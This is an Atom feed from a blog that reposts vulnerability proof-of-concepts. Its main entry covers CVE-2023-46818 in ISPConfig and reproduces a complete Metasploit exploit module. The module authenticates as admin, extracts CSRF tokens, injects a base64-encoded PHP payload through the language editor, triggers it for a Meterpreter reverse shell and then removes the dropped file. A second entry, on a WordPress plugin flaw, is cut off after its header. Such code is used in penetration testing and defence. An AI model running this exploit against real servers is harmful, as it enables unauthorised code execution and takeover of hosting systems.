<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-27T16:45:13.472Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
    <link href="http://example.com/2025/06/27/github_2741714027/"/>
    <id>http://example.com/2025/06/27/github_2741714027/</id>
    <published>2025-06-27T16:45:13.475Z</published>
    <updated>2025-06-27T16:45:13.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/93a83346990bc29e4b951c900aaafa9eb3cffd72/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/93a83346990bc29e4b951c900aaafa9eb3cffd72/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br><br>    <span class="hljs-comment"># Try to log in and parse version if credentials are provided</span><br>    <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>] &amp;&amp; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      login_res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>          <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>          <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.include?(<span class="hljs-string">&#x27;admin&#x27;</span>) || login_res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>        <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>        settings_res = send_request_cgi(&#123;<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>          <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>          <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">if</span> settings_res<br>          doc = settings_res.get_html_document<br>          <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>          version_text = doc.text[<span class="hljs-regexp">/ISPConfig\s*v?(\d+\.\d+(?:\.\d+)?(?:p\d+)?)/i</span>, <span class="hljs-number">1</span>]<br>          <span class="hljs-keyword">if</span> version_text<br>            print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> CheckCode::Appears(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>          end<br>        end<br>      end<br>    end<br><br>    <span class="hljs-comment"># Fallback to the previous check</span><br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,nil))<br>      &#125;)<br>    end<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,nil)&amp;.include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    b64_payload = Base64.strict_encode64(payload.encoded)<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,base64_decode(&#x27;<span class="hljs-subst">#&#123;b64_payload&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cross-Site Request Forgery (CSRF) vulnerability in sh1zen WP Optimizer allows SQL Injection This</title>
    <link href="http://example.com/2025/06/27/github_1839345868/"/>
    <id>http://example.com/2025/06/27/github_1839345868/</id>
    <published>2025-06-27T16:00:09.121Z</published>
    <updated>2025-06-27T16:00:09.117Z</updated>
    
